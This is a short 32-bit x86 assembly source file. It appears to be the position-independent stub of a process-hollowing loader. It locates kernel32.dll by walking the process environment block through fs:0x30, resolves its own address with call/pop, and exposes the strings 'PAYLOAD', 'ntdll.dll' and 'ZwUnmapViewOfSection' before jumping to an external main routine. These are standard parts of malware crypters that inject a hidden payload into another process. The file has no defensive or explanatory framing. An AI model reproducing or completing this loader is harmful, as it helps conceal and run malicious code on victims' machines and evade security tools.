[BITS 32]

global _start
global _get_kernel32
extern _MyMain

global _get_payload_string
global _get_ntdll_string
global _get_zwunmapviewofsection_string

section .text
_start:
	jmp		_MyMain

_szPayload:					db		"PAYLOAD", 0
_szNtdll:					db		"ntdll.dll", 0
_szZwUnmapViewOfSection		db		"ZwUnmapViewOfSection", 0

_get_loc:
	call	_loc

_loc:
	pop		edx
	ret

_get_kernel32:
	mov		eax, [fs:0x30]
	mov		eax, [eax + 0x0C]
	mov		eax, [eax + 0x14]
	mov		eax, [eax]
	mov		eax, [eax]
	mov		eax, [eax + 0x10]
	ret

_get_payload_string:
	call	_get_loc
	sub	 	edx, _loc - _szPayload
	mov 	eax, edx
	ret

_get_ntdll_string:
	call	_get_loc
	sub		edx, _loc - _szNtdll
	mov		eax, edx
	ret

_get_zwunmapviewofsection_string:
	call	_get_loc
	sub		edx, _loc - _szZwUnmapViewOfSection
	mov 	eax, edx
	ret